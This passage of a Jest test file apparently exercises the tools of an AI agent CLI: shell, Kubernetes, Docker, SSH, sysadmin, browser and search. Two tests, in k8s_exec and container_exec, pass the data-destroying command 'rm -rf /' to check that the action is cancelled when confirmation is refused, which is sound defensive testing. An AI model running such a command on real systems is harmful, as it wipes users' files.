    // non-existent cluster, exceeding Jest's per-test timeout.
    const itLocal = process.env.CI ? it.skip : it;

    itLocal("k8s_pods with namespace and label", async () => {
      const result = await executeTool("k8s_pods", {
        namespace: "default",
        label: "app=web",
      });
      expect(typeof result).toBe("string");
    });

    itLocal("k8s_pods with context parameter", async () => {
      const result = await executeTool("k8s_pods", { context: "my-context" });
      expect(typeof result).toBe("string");
    });

    itLocal("k8s_pods with server parameter (SSH tunnel)", async () => {
      const result = await executeTool("k8s_pods", { server: "user@host" });
      expect(typeof result).toBe("string");
    });
  });

  // ─── glob mtime sorting ───────────────────────────────────────
  describe("glob mtime sorting", () => {
    it("sorts files by modification time (most recent first)", async () => {
      // Create files with different mtimes
      const f1 = path.join(tmpDir, "old.txt");
      const f2 = path.join(tmpDir, "new.txt");
      fs.writeFileSync(f1, "old");
      // Set old mtime
      const oldTime = new Date(2020, 0, 1);
      fs.utimesSync(f1, oldTime, oldTime);
      // Create newer file
      fs.writeFileSync(f2, "new");

      const result = await executeTool("glob", {
        pattern: "*.txt",
        path: tmpDir,
      });
      const lines = result.split("\n");
      // The newer file should come first
      expect(lines[0]).toContain("new.txt");
      expect(lines[1]).toContain("old.txt");
    });
  });

  // ─── cancelPendingAskUser ──────────────────────────────────────
  describe("cancelPendingAskUser", () => {
    const { cancelPendingAskUser } = require("../cli/tools");

    it("does not throw when no pending ask", () => {
      expect(() => cancelPendingAskUser()).not.toThrow();
    });
  });

  // ─── setAskUserHandler ────────────────────────────────────────
  describe("setAskUserHandler", () => {
    const { setAskUserHandler } = require("../cli/tools");

    it("sets handler without throwing", () => {
      expect(() => setAskUserHandler(() => {})).not.toThrow();
      // Reset
      setAskUserHandler(null);
    });
  });

  // ─── bash enriched errors on real commands ────────────────────
  describe("bash enriched errors", () => {
    it("enriches command not found error", async () => {
      const result = await executeTool("bash", {
        command: "nonexistent_command_xyz_abc_123",
      });
      expect(result).toContain("EXIT");
      expect(result).toContain("HINT");
      expect(result).toContain("not installed");
    });
  });

  // ─── list_directory max_depth ─────────────────────────────────
  describe("list_directory max_depth", () => {
    it("respects max_depth parameter", async () => {
      const d1 = path.join(tmpDir, "level1");
      const d2 = path.join(d1, "level2");
      const d3 = path.join(d2, "level3");
      fs.mkdirSync(d3, { recursive: true });
      fs.writeFileSync(path.join(d3, "deep.txt"), "");

      const result = await executeTool("list_directory", {
        path: tmpDir,
        max_depth: 1,
      });
      expect(result).toContain("level1/");
      expect(result).not.toContain("level2");
    });
  });

  // ─── deployment_status tool ───────────────────────────────────
  describe('executeTool("deployment_status")', () => {
    it("returns no configs message when deploy.json missing", async () => {
      const result = await executeTool("deployment_status", {});
      expect(typeof result).toBe("string");
    });
  });

  // ─── sysadmin read-only actions (run locally) ─────────────────
  describe("sysadmin read-only actions", () => {
    it("process_list runs locally", async () => {
      const result = await executeTool("sysadmin", { action: "process_list" });
      expect(typeof result).toBe("string");
    });

    it("process_list with mem sort", async () => {
      const result = await executeTool("sysadmin", {
        action: "process_list",
        sort_by: "mem",
        limit: 5,
      });
      expect(typeof result).toBe("string");
    });

    it("disk_usage runs locally", async () => {
      const result = await executeTool("sysadmin", {
        action: "disk_usage",
        path: tmpDir,
      });
      expect(result.length).toBeGreaterThan(0);
    });

    it("network_status runs locally", async () => {
      const result = await executeTool("sysadmin", {
        action: "network_status",
      });
      expect(result.length).toBeGreaterThan(0);
    });

    it("log_tail runs locally on existing file", async () => {
      const logFile = path.join(tmpDir, "test.log");
      fs.writeFileSync(logFile, "log line 1\nlog line 2\nlog line 3\n");
      const result = await executeTool("sysadmin", {
        action: "log_tail",
        path: logFile,
        lines: 2,
      });
      expect(result).toContain("log line");
    });

    it("find_large runs locally", async () => {
      const result = await executeTool("sysadmin", {
        action: "find_large",
        path: tmpDir,
        limit: 5,
        min_size: "1G",
      });
      expect(typeof result).toBe("string");
    });

    it("cron list runs locally", async () => {
      const result = await executeTool("sysadmin", {
        action: "cron",
        cron_action: "list",
      });
      expect(typeof result).toBe("string");
    });

    it("user_manage list runs locally", async () => {
      const result = await executeTool("sysadmin", {
        action: "user_manage",
        user_action: "list",
      });
      expect(typeof result).toBe("string");
    });

    it("journalctl runs locally", async () => {
      const result = await executeTool("sysadmin", {
        action: "journalctl",
        lines: 5,
      });
      expect(typeof result).toBe("string");
    });

    it("journalctl with unit and priority", async () => {
      const result = await executeTool("sysadmin", {
        action: "journalctl",
        lines: 5,
        unit: "sshd",
        priority: "err",
        since: "1 hour ago",
      });
      expect(typeof result).toBe("string");
    });
  });

  // ─── brain_write success paths ──────────────────────────────────
  describe("brain_write success paths", () => {
    it("creates a new brain document", async () => {
      // brain is required lazily; mock readDocument and writeDocument via spyOn
      const brain = require("../cli/brain");
      const readSpy = jest
        .spyOn(brain, "readDocument")
        .mockReturnValue({ content: null });
      const writeSpy = jest
        .spyOn(brain, "writeDocument")
        .mockImplementation(() => {});
      const result = await executeTool("brain_write", {
        name: "test-doc",
        content: "hello",
        mode: "create",
      });
      expect(result).toContain("Created");
      expect(result).toContain("test-doc");
      readSpy.mockRestore();
      writeSpy.mockRestore();
    });

    it("returns error when creating existing document", async () => {
      const brain = require("../cli/brain");
      const readSpy = jest
        .spyOn(brain, "readDocument")
        .mockReturnValue({ content: "existing" });
      const writeSpy = jest
        .spyOn(brain, "writeDocument")
        .mockImplementation(() => {});
      const result = await executeTool("brain_write", {
        name: "test-doc",
        content: "hello",
        mode: "create",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("already exists");
      readSpy.mockRestore();
      writeSpy.mockRestore();
    });

    it("updates an existing brain document", async () => {
      const brain = require("../cli/brain");
      const readSpy = jest
        .spyOn(brain, "readDocument")
        .mockReturnValue({ content: null });
      const writeSpy = jest
        .spyOn(brain, "writeDocument")
        .mockImplementation(() => {});
      const result = await executeTool("brain_write", {
        name: "test-doc",
        content: "updated",
        mode: "update",
      });
      expect(result).toContain("Updated");
      expect(result).toContain("test-doc");
      readSpy.mockRestore();
      writeSpy.mockRestore();
    });

    it("appends to brain document with existing content", async () => {
      const brain = require("../cli/brain");
      const readSpy = jest
        .spyOn(brain, "readDocument")
        .mockReturnValue({ content: "existing" });
      const writeSpy = jest
        .spyOn(brain, "writeDocument")
        .mockImplementation(() => {});
      const result = await executeTool("brain_write", {
        name: "test-doc",
        content: "appended",
        mode: "append",
      });
      expect(result).toContain("Appended");
      expect(result).toContain("test-doc");
      readSpy.mockRestore();
      writeSpy.mockRestore();
    });

    it("appends to empty brain document", async () => {
      const brain = require("../cli/brain");
      const readSpy = jest
        .spyOn(brain, "readDocument")
        .mockReturnValue({ content: null });
      const writeSpy = jest
        .spyOn(brain, "writeDocument")
        .mockImplementation(() => {});
      const result = await executeTool("brain_write", {
        name: "new-doc",
        content: "first content",
        mode: "append",
      });
      expect(result).toContain("Appended");
      readSpy.mockRestore();
      writeSpy.mockRestore();
    });
  });

  // ─── task_list success paths (mocked) ─────────────────────────
  describe("task_list success paths", () => {
    beforeEach(() => {
      jest.mock("../cli/tasks", () => ({
        createTasks: jest.fn().mockReturnValue([
          { id: "task-1", description: "Do thing one" },
          { id: "task-2", description: "Do thing two" },
        ]),
        updateTask: jest.fn().mockReturnValue(true),
        getTaskList: jest.fn().mockReturnValue({
          name: "myplan",
          tasks: [
            { id: "task-1", description: "Do thing one", status: "pending" },
          ],
        }),
        renderTaskList: jest.fn().mockReturnValue("[tasks rendered]"),
        hasActiveTasks: jest.fn().mockReturnValue(true),
      }));
    });
    afterEach(() => {
      jest.unmock("../cli/tasks");
    });

    it("creates task list", async () => {
      const result = await executeTool("task_list", {
        action: "create",
        name: "myplan",
        tasks: ["Do thing one", "Do thing two"],
      });
      expect(result).toContain("Created task list");
      expect(result).toContain("myplan");
      expect(result).toContain("2 tasks");
    });

    it("updates a task", async () => {
      const result = await executeTool("task_list", {
        action: "update",
        task_id: "task-1",
        status: "done",
        result: "Completed successfully",
      });
      expect(result).toContain("Updated");
      expect(result).toContain("task-1");
      expect(result).toContain("done");
    });

    it("updates a task without result", async () => {
      const result = await executeTool("task_list", {
        action: "update",
        task_id: "task-1",
        status: "in_progress",
      });
      expect(result).toContain("Updated");
      expect(result).toContain("in_progress");
    });

    it("returns error for task not found on update", async () => {
      const tasks = require("../cli/tasks");
      tasks.updateTask.mockReturnValue(false);
      const result = await executeTool("task_list", {
        action: "update",
        task_id: "nonexistent",
        status: "done",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("Task not found");
    });

    it("gets task list", async () => {
      const result = await executeTool("task_list", { action: "get" });
      expect(result).toContain("task-1");
    });

    it("returns no active tasks when empty", async () => {
      const tasks = require("../cli/tasks");
      tasks.getTaskList.mockReturnValue({ name: "", tasks: [] });
      const result = await executeTool("task_list", { action: "get" });
      expect(result).toContain("No active tasks");
    });
  });

  // ─── switch_model success (mocked) ────────────────────────────
  describe("switch_model success", () => {
    it("switches model when found", async () => {
      const registry = require("../cli/providers/registry");
      const setModelSpy = jest
        .spyOn(registry, "setActiveModel")
        .mockReturnValue(true);
      const providerSpy = jest
        .spyOn(registry, "getActiveProviderName")
        .mockReturnValue("ollama");
      const modelSpy = jest
        .spyOn(registry, "getActiveModelId")
        .mockReturnValue("qwen3-coder");

      const result = await executeTool("switch_model", {
        model: "qwen3-coder",
      });
      expect(result).toContain("Switched to");
      expect(result).toContain("ollama");

      setModelSpy.mockRestore();
      providerSpy.mockRestore();
      modelSpy.mockRestore();
    });

    it("returns error for unknown model", async () => {
      const registry = require("../cli/providers/registry");
      const setModelSpy = jest
        .spyOn(registry, "setActiveModel")
        .mockReturnValue(false);

      const result = await executeTool("switch_model", {
        model: "nonexistent-model",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("Unknown model");

      setModelSpy.mockRestore();
    });
  });

  // ─── gh_workflow_trigger cancelled ────────────────────────────
  describe("gh_workflow_trigger cancelled", () => {
    it("returns CANCELLED when user declines", async () => {
      const { confirm } = require("../cli/safety");
      confirm.mockResolvedValueOnce(false);
      const result = await executeTool("gh_workflow_trigger", {
        workflow: "test.yml",
      });
      expect(result).toContain("CANCELLED");
    });
  });

  // ─── k8s_exec cancelled ──────────────────────────────────────
  describe("k8s_exec cancelled", () => {
    it("returns CANCELLED when user declines", async () => {
      const { confirm } = require("../cli/safety");
      confirm.mockResolvedValueOnce(false);
      const result = await executeTool(
        "k8s_exec",
        { pod: "test-pod", command: "rm -rf /", namespace: "default" },
        { autoConfirm: false },
      );
      expect(result).toContain("CANCELLED");
    });
  });

  // ─── container_list local ─────────────────────────────────────
  describe("container_list local", () => {
    it("runs docker ps locally", async () => {
      const result = await executeTool("container_list", {});
      // Docker may or may not be installed, but path is exercised
      expect(typeof result).toBe("string");
    });

    it("runs docker ps with all flag", async () => {
      const result = await executeTool("container_list", { all: true });
      expect(typeof result).toBe("string");
    });
  });

  // ─── service_manage local status ──────────────────────────────
  describe("service_manage local status", () => {
    it("runs systemctl status locally", async () => {
      const result = await executeTool("service_manage", {
        service: "nonexistent-svc-xyz",
        action: "status",
      });
      // Will fail on macOS (no systemctl) but exercises the code path
      expect(typeof result).toBe("string");
    });
  });

  // ─── service_logs local ───────────────────────────────────────
  describe("service_logs local", () => {
    it("runs journalctl locally", async () => {
      const result = await executeTool("service_logs", {
        service: "sshd",
        lines: 5,
      });
      // Will fail on macOS (no journalctl) but exercises code
      expect(typeof result).toBe("string");
    });

    it("runs journalctl with since flag", async () => {
      const result = await executeTool("service_logs", {
        service: "sshd",
        since: "1 hour ago",
      });
      expect(typeof result).toBe("string");
    });
  });

  // ─── container_logs local ─────────────────────────────────────
  describe("container_logs local", () => {
    it("runs docker logs locally", async () => {
      const result = await executeTool("container_logs", {
        container: "nonexistent-container-xyz",
      });
      expect(typeof result).toBe("string");
    });

    it("runs docker logs with since", async () => {
      const result = await executeTool("container_logs", {
        container: "test",
        since: "1h",
      });
      expect(typeof result).toBe("string");
    });
  });

  // ─── k8s_pods local ──────────────────────────────────────────
  describe("k8s_pods variations", () => {
    it("runs without namespace (all namespaces)", async () => {
      const result = await executeTool("k8s_pods", {});
      expect(typeof result).toBe("string");
    });

    it("runs with namespace", async () => {
      const result = await executeTool("k8s_pods", { namespace: "default" });
      expect(typeof result).toBe("string");
    });

    it("runs with label", async () => {
      const result = await executeTool("k8s_pods", { label: "app=web" });
      expect(typeof result).toBe("string");
    });
  });

  // ─── k8s_logs with options ────────────────────────────────────
  describe("k8s_logs with options", () => {
    it("runs with since and container", async () => {
      const result = await executeTool("k8s_logs", {
        pod: "test-pod",
        since: "1h",
        container: "main",
        namespace: "kube-system",
        tail: 50,
      });
      expect(typeof result).toBe("string");
    });
  });

  // ─── k8s_apply dry_run ────────────────────────────────────────
  describe("k8s_apply dry_run", () => {
    it("runs dry_run without confirmation", async () => {
      const result = await executeTool("k8s_apply", {
        file: "/tmp/nonexistent.yaml",
        dry_run: true,
      });
      expect(typeof result).toBe("string");
    });

    it("runs with namespace", async () => {
      const result = await executeTool("k8s_apply", {
        file: "/tmp/nonexistent.yaml",
        dry_run: true,
        namespace: "default",
      });
      expect(typeof result).toBe("string");
    });
  });

  // ─── k8s_rollout variations ───────────────────────────────────
  describe("k8s_rollout variations", () => {
    it("runs status (no confirmation needed)", async () => {
      const result = await executeTool("k8s_rollout", {
        action: "status",
        deployment: "web",
      });
      expect(typeof result).toBe("string");
    });

    it("runs restart (cancelled)", async () => {
      const { confirm } = require("../cli/safety");
      confirm.mockResolvedValueOnce(false);
      const result = await executeTool(
        "k8s_rollout",
        { action: "restart", deployment: "web" },
        { autoConfirm: false },
      );
      expect(result).toContain("CANCELLED");
    });

    it("runs undo (cancelled)", async () => {
      const { confirm } = require("../cli/safety");
      confirm.mockResolvedValueOnce(false);
      const result = await executeTool(
        "k8s_rollout",
        { action: "undo", deployment: "web" },
        { autoConfirm: false },
      );
      expect(result).toContain("CANCELLED");
    });
  });

  // ─── deploy error paths with config ───────────────────────────
  describe("deploy with config", () => {
    it("returns error for nonexistent config", async () => {
      const result = await executeTool("deploy", {
        config: "nonexistent-config-xyz",
      });
      expect(result).toContain("ERROR");
    });
  });

  // ─── container_manage variations ──────────────────────────────
  describe("container_manage variations", () => {
    it("inspect runs without confirmation", async () => {
      const result = await executeTool("container_manage", {
        container: "test-xyz",
        action: "inspect",
      });
      expect(typeof result).toBe("string");
    });

    it("stop is cancelled", async () => {
      const { confirm } = require("../cli/safety");
      confirm.mockResolvedValueOnce(false);
      const result = await executeTool(
        "container_manage",
        { container: "test", action: "stop" },
        { autoConfirm: false },
      );
      expect(result).toContain("CANCELLED");
    });

    it("remove action maps to docker rm", async () => {
      const result = await executeTool("container_manage", {
        container: "test-xyz-nonexistent",
        action: "remove",
      });
      expect(typeof result).toBe("string");
    });
  });

  // ─── container_exec safe commands without confirmation ────────
  describe("container_exec safe commands", () => {
    it("runs safe command without confirmation", async () => {
      const result = await executeTool("container_exec", {
        container: "test-xyz",
        command: "echo hello",
      });
      expect(typeof result).toBe("string");
    });
  });

  // ─── sysadmin service actions ─────────────────────────────────
  describe("sysadmin service actions", () => {
    it("service status runs locally", async () => {
      const result = await executeTool("sysadmin", {
        action: "service",
        service_action: "status",
        service_name: "sshd",
      });
      expect(typeof result).toBe("string");
    });

    it("service list_failed runs without service_name", async () => {
      const result = await executeTool("sysadmin", {
        action: "service",
        service_action: "list_failed",
      });
      expect(typeof result).toBe("string");
    });

    it("service_name adds .service suffix", async () => {
      const result = await executeTool("sysadmin", {
        action: "service",
        service_action: "status",
        service_name: "nginx",
      });
      expect(typeof result).toBe("string");
    });

    it("service_name with .service keeps it", async () => {
      const result = await executeTool("sysadmin", {
        action: "service",
        service_action: "status",
        service_name: "nginx.service",
      });
      expect(typeof result).toBe("string");
    });
  });

  // ─── sysadmin firewall status ─────────────────────────────────
  describe("sysadmin firewall status", () => {
    it("firewall status runs locally", async () => {
      const result = await executeTool("sysadmin", {
        action: "firewall",
        firewall_action: "status",
      });
      expect(typeof result).toBe("string");
    });
  });

  // ─── sysadmin audit runs locally ──────────────────────────────
  describe("sysadmin audit", () => {
    it("runs full audit locally", async () => {
      const result = await executeTool("sysadmin", { action: "audit" });
      expect(typeof result).toBe("string");
      expect(result.length).toBeGreaterThan(0);
    });
  });

  // ─── sysadmin ssl_check with cert_path ────────────────────────
  describe("sysadmin ssl_check", () => {
    it.skip("runs ssl_check with cert_path — calls openssl", async () => {
      const result = await executeTool("sysadmin", {
        action: "ssl_check",
        cert_path: "/nonexistent/cert.pem",
      });
      expect(typeof result).toBe("string");
    });

    it.skip("runs ssl_check with domain — requires network", async () => {
      const result = await executeTool("sysadmin", {
        action: "ssl_check",
        domain: "example.com",
      });
      expect(typeof result).toBe("string");
    }, 15000);
  });

  // ─── sysadmin package list ────────────────────────────────────
  describe("sysadmin package list", () => {
    it("runs package list locally", async () => {
      const result = await executeTool("sysadmin", {
        action: "package",
        package_action: "list",
      });
      expect(typeof result).toBe("string");
    });

    it("package upgrade exercises path", async () => {
      const result = await executeTool("sysadmin", {
        action: "package",
        package_action: "upgrade",
      });
      expect(typeof result).toBe("string");
    });
  });

  // ─── sysadmin user_manage info ────────────────────────────────
  describe("sysadmin user_manage info", () => {
    it("runs user info locally", async () => {
      const result = await executeTool("sysadmin", {
        action: "user_manage",
        user_action: "info",
        user: process.env.USER || "root",
      });
      expect(typeof result).toBe("string");
    });
  });

  // ─── autoFixPath extension swap ───────────────────────────────
  describe("autoFixPath extension swap", () => {
    const { autoFixPath } = require("../cli/tools");

    it("swaps .ts to .js when .js exists", async () => {
      const fp = path.join(tmpDir, "ext-swap.js");
      fs.writeFileSync(fp, "hello");
      const result = await autoFixPath(path.join(tmpDir, "ext-swap.ts"));
      if (result.fixedPath) {
        expect(result.fixedPath).toContain("ext-swap.js");
        expect(result.message).toContain("auto-fixed");
      }
    });

    it("adds extension when missing", async () => {
      const fp = path.join(tmpDir, "noext.js");
      fs.writeFileSync(fp, "hello");
      const result = await autoFixPath(path.join(tmpDir, "noext"));
      if (result.fixedPath) {
        expect(result.fixedPath).toContain("noext.js");
        expect(result.message).toContain("auto-fixed");
      }
    });

    it("normalizes double slashes", async () => {
      const fp = path.join(tmpDir, "normalize.txt");
      fs.writeFileSync(fp, "hello");
      const result = await autoFixPath(tmpDir + "//normalize.txt");
      if (result.fixedPath) {
        expect(result.message).toContain("auto-fixed");
      }
    });
  });

  // ─── Perplexity web_search path ───────────────────────────────
  describe("web_search with Perplexity", () => {
    const axios = require("axios");

    it("uses Perplexity when API key available", async () => {
      const origKey = process.env.PERPLEXITY_API_KEY;
      process.env.PERPLEXITY_API_KEY = "test-key";

      jest.spyOn(axios, "post").mockResolvedValueOnce({
        data: {
          choices: [{ message: { content: "Perplexity answer here" } }],
          citations: [
            "https://example.com/source1",
            "https://example.com/source2",
          ],
        },
      });

      const result = await executeTool("web_search", { query: "test query" });
      expect(result).toContain("Perplexity");
      expect(result).toContain("Perplexity answer here");
      expect(result).toContain("Sources");
      expect(result).toContain("source1");

      process.env.PERPLEXITY_API_KEY = origKey || "";
      if (!origKey) delete process.env.PERPLEXITY_API_KEY;
      axios.post.mockRestore();
    });

    it("falls back to DuckDuckGo when Perplexity fails", async () => {
      const origKey = process.env.PERPLEXITY_API_KEY;
      process.env.PERPLEXITY_API_KEY = "test-key";

      jest
        .spyOn(axios, "post")
        .mockRejectedValueOnce(new Error("Perplexity API error"));
      jest.spyOn(axios, "get").mockResolvedValueOnce({
        data: '<a class="result__a" href="/l/?uddg=https%3A%2F%2Ffallback.com&rut=x">Fallback Result</a>',
      });

      const result = await executeTool("web_search", { query: "test query" });
      expect(result).toContain("Fallback Result");

      process.env.PERPLEXITY_API_KEY = origKey || "";
      if (!origKey) delete process.env.PERPLEXITY_API_KEY;
      axios.post.mockRestore();
      axios.get.mockRestore();
    });

    it("handles Perplexity response without citations", async () => {
      const origKey = process.env.PERPLEXITY_API_KEY;
      process.env.PERPLEXITY_API_KEY = "test-key";

      jest.spyOn(axios, "post").mockResolvedValueOnce({
        data: {
          choices: [{ message: { content: "Answer without sources" } }],
          citations: [],
        },
      });

      const result = await executeTool("web_search", { query: "test" });
      expect(result).toContain("Answer without sources");
      expect(result).not.toContain("Sources");

      process.env.PERPLEXITY_API_KEY = origKey || "";
      if (!origKey) delete process.env.PERPLEXITY_API_KEY;
      axios.post.mockRestore();
    });
  });

  // ─── enrichBashError backup pattern ───────────────────────────
  describe("enrichBashError backup pattern", () => {
    const { enrichBashError } = require("../cli/tools");

    it("warns about double backup pattern", () => {
      const result = enrichBashError(
        "error",
        'for f in *.txt; do cp $f $f.bak; sed -i.bak "s/a/b/" $f; done',
      );
      expect(result).toContain("HINT");
      expect(result).toContain("double backups");
    });
  });

  // ─── ask_user with handler ────────────────────────────────────
  describe("ask_user with handler", () => {
    const { setAskUserHandler, cancelPendingAskUser } = require("../cli/tools");

    afterEach(() => {
      setAskUserHandler(null);
    });

    it("uses custom handler when set", async () => {
      setAskUserHandler((question, options) => {
        return Promise.resolve("user answer here");
      });
      const result = await executeTool("ask_user", {
        question: "What color?",
        options: ["red", "blue"],
      });
      expect(result).toBe("user answer here");
    });

    it("cancels pending ask_user", async () => {
      setAskUserHandler((question, options) => {
        return new Promise((resolve) => {
          // never resolves naturally — unref so Jest can exit after cancel
          const t = setTimeout(() => resolve("late"), 60000);
          if (t && t.unref) t.unref();
        });
      });

      const promise = executeTool("ask_user", { question: "Wait?" });
      // Give the handler a tick to set up
      await new Promise((r) => setTimeout(r, 50));
      cancelPendingAskUser();
      const result = await promise;
      expect(result).toBe("CANCELLED");
    });
  });

  // ─── browser_navigate mocked ──────────────────────────────────
  describe("browser tools mocked", () => {
    afterEach(() => {
      mockBrowserNavigate.mockReset();
      mockBrowserScreenshot.mockReset();
      mockBrowserClick.mockReset();
      mockBrowserFill.mockReset();
    });

    it("browser_navigate returns formatted result", async () => {
      mockBrowserNavigate.mockResolvedValue({
        title: "Test Page",
        url: "https://example.com",
        text: "Hello World",
        links: [{ text: "Link1", href: "https://link.com" }],
      });
      const result = await executeTool("browser_open", {
        url: "https://example.com",
      });
      expect(result).toContain("Title: Test Page");
      expect(result).toContain("Hello World");
      expect(result).toContain("Link1");
    });

    it("browser_navigate handles error", async () => {
      mockBrowserNavigate.mockRejectedValue(
        new Error("Playwright not installed"),
      );
      const result = await executeTool("browser_open", {
        url: "https://example.com",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("Playwright");
    });

    it("browser_navigate with no links", async () => {
      mockBrowserNavigate.mockResolvedValue({
        title: "Page",
        url: "https://x.com",
        text: "content",
        links: [],
      });
      const result = await executeTool("browser_open", {
        url: "https://x.com",
      });
      expect(result).toContain("Title: Page");
      expect(result).not.toContain("Links:");
    });

    it("browser_screenshot returns path", async () => {
      mockBrowserScreenshot.mockResolvedValue({
        path: "/tmp/screenshot.png",
        title: "Test",
        url: "https://example.com",
      });
      const result = await executeTool("browser_screenshot", {
        url: "https://example.com",
      });
      expect(result).toContain("Screenshot saved");
      expect(result).toContain("/tmp/screenshot.png");
    });

    it("browser_screenshot handles error", async () => {
      mockBrowserScreenshot.mockRejectedValue(new Error("timeout"));
      const result = await executeTool("browser_screenshot", {
        url: "https://example.com",
      });
      expect(result).toContain("ERROR");
    });

    it("browser_click returns result", async () => {
      mockBrowserClick.mockResolvedValue("Clicked element");
      const result = await executeTool("browser_click", {
        url: "https://example.com",
        selector: "#btn",
      });
      expect(result).toBe("Clicked element");
    });

    it("browser_click handles error", async () => {
      mockBrowserClick.mockRejectedValue(new Error("selector not found"));
      const result = await executeTool("browser_click", {
        url: "https://example.com",
        selector: "#btn",
      });
      expect(result).toContain("ERROR");
    });

    it("browser_fill returns result", async () => {
      mockBrowserFill.mockResolvedValue("Filled form");
      const result = await executeTool("browser_fill", {
        url: "https://example.com",
        selector: "#input",
        value: "test",
      });
      expect(result).toBe("Filled form");
    });

    it("browser_fill handles error", async () => {
      mockBrowserFill.mockRejectedValue(new Error("element not visible"));
      const result = await executeTool("browser_fill", {
        url: "https://example.com",
        selector: "#input",
        value: "test",
      });
      expect(result).toContain("ERROR");
    });
  });

  // ─── gh_run_view validation ─────────────────────────────────
  describe("gh_run_view validation", () => {
    it("returns error without run_id", async () => {
      const result = await executeTool("gh_run_view", {});
      expect(result).toContain("ERROR");
      expect(result).toContain("run_id");
    });
  });

  // ─── gh_run_list exercises code path ─────────────────────────
  describe("gh_run_list", () => {
    it.skip("exercises run list with filters — requires gh CLI", async () => {
      const result = await executeTool("gh_run_list", {
        limit: 5,
        workflow: "ci.yml",
        branch: "main",
        status: "success",
      });
      expect(typeof result).toBe("string");
    });

    it.skip("exercises run list without filters — requires gh CLI", async () => {
      const result = await executeTool("gh_run_list", {});
      expect(typeof result).toBe("string");
    });
  });

  // ─── ssh tool validation errors ───────────────────────────────
  describe("ssh tool validation", () => {
    it("ssh_exec requires server", async () => {
      const result = await executeTool("ssh_exec", { command: "ls" });
      expect(result).toContain("ERROR");
      expect(result).toContain("server");
    });

    it("ssh_exec requires command", async () => {
      const result = await executeTool("ssh_exec", { server: "myserver" });
      expect(result).toContain("ERROR");
      expect(result).toContain("command");
    });

    it("ssh_upload requires all params", async () => {
      const result = await executeTool("ssh_upload", { server: "myserver" });
      expect(result).toContain("ERROR");
      expect(result).toContain("local_path");
    });

    it("ssh_download requires all params", async () => {
      const result = await executeTool("ssh_download", {
        server: "myserver",
        remote_path: "/tmp/x",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("local_path");
    });
  });

  // ─── service_manage validation errors ─────────────────────────
  describe("service_manage validation", () => {
    it("requires service", async () => {
      const result = await executeTool("service_manage", { action: "status" });
      expect(result).toContain("ERROR");
      expect(result).toContain("service is required");
    });

    it("requires action", async () => {
      const result = await executeTool("service_manage", { service: "nginx" });
      expect(result).toContain("ERROR");
      expect(result).toContain("action is required");
    });

    it("rejects invalid action", async () => {
      const result = await executeTool("service_manage", {
        service: "nginx",
        action: "invalid",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("invalid action");
    });

    it("non-status action is cancelled", async () => {
      const { confirm } = require("../cli/safety");
      confirm.mockResolvedValueOnce(false);
      const result = await executeTool(
        "service_manage",
        { service: "nginx", action: "restart" },
        { autoConfirm: false },
      );
      expect(result).toContain("CANCELLED");
    });
  });

  // ─── service_logs validation ──────────────────────────────────
  describe("service_logs validation", () => {
    it("requires service", async () => {
      const result = await executeTool("service_logs", {});
      expect(result).toContain("ERROR");
      expect(result).toContain("service is required");
    });
  });

  // ─── container tool validation ────────────────────────────────
  describe("container_logs validation", () => {
    it("requires container", async () => {
      const result = await executeTool("container_logs", {});
      expect(result).toContain("ERROR");
      expect(result).toContain("container is required");
    });
  });

  describe("container_manage validation", () => {
    it("requires container", async () => {
      const result = await executeTool("container_manage", { action: "stop" });
      expect(result).toContain("ERROR");
      expect(result).toContain("container is required");
    });

    it("requires action", async () => {
      const result = await executeTool("container_manage", {
        container: "test",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("action is required");
    });

    it("rejects invalid action", async () => {
      const result = await executeTool("container_manage", {
        container: "test",
        action: "invalid",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("invalid action");
    });
  });

  describe("container_exec validation", () => {
    it("requires container", async () => {
      const result = await executeTool("container_exec", { command: "ls" });
      expect(result).toContain("ERROR");
      expect(result).toContain("container is required");
    });

    it("requires command", async () => {
      const result = await executeTool("container_exec", { container: "test" });
      expect(result).toContain("ERROR");
      expect(result).toContain("command is required");
    });

    it("destructive command cancelled", async () => {
      const { confirm } = require("../cli/safety");
      confirm.mockResolvedValueOnce(false);
      const result = await executeTool(
        "container_exec",
        { container: "test", command: "rm -rf /" },
        { autoConfirm: false },
      );
      expect(result).toContain("CANCELLED");
    });
  });

  // ─── deploy validation ────────────────────────────────────────
  describe("deploy validation", () => {
    it("requires server and remote_path for manual deploy", async () => {
      const result = await executeTool("deploy", { method: "rsync" });
      expect(result).toContain("ERROR");
    });

    it("requires local_path for rsync", async () => {
      const result = await executeTool("deploy", {
        server: "myserver",
        remote_path: "/app",
        method: "rsync",
      });
      expect(result).toContain("ERROR");
    });
  });

  // ─── sysadmin additional actions ──────────────────────────────
  describe("sysadmin network_status", () => {
    it("runs network_status locally", async () => {
      const result = await executeTool("sysadmin", {
        action: "network_status",
      });
      expect(typeof result).toBe("string");
    });
  });

  describe("sysadmin user_manage", () => {
    it("runs user list locally", async () => {
      const result = await executeTool("sysadmin", {
        action: "user_manage",
        user_action: "list",
      });
      expect(typeof result).toBe("string");
    });

    it("user_manage requires user_action", async () => {
      const result = await executeTool("sysadmin", { action: "user_manage" });
      expect(result).toContain("ERROR");
      expect(result).toContain("user_action");
    });

    it("user_manage info requires user", async () => {
      const result = await executeTool("sysadmin", {
        action: "user_manage",
        user_action: "info",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("user is required");
    });

    it("user_manage create requires user", async () => {
      const result = await executeTool("sysadmin", {
        action: "user_manage",
        user_action: "create",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("user is required");
    });

    it("user_manage delete requires user", async () => {
      const result = await executeTool("sysadmin", {
        action: "user_manage",
        user_action: "delete",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("user is required");
    });

    it("user_manage add_ssh_key requires user", async () => {
      const result = await executeTool("sysadmin", {
        action: "user_manage",
        user_action: "add_ssh_key",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("user is required");
    });

    it("user_manage add_ssh_key requires ssh_key", async () => {
      const result = await executeTool("sysadmin", {
        action: "user_manage",
        user_action: "add_ssh_key",
        user: "testuser",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("ssh_key");
    });

    it("user_manage unknown action", async () => {
      const result = await executeTool("sysadmin", {
